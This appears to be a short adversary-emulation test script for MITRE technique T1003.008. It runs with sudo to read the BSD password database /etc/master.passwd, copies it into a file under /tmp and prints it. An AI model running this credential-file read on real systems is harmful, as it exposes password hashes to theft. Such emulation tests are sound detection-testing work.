#!/bin/sh
# T1003.008 test 2: Access /etc/master.passwd (Local)
# elevation_required: True
sudo cat /etc/master.passwd > /tmp/T1003.008.txt
cat /tmp/T1003.008.txt
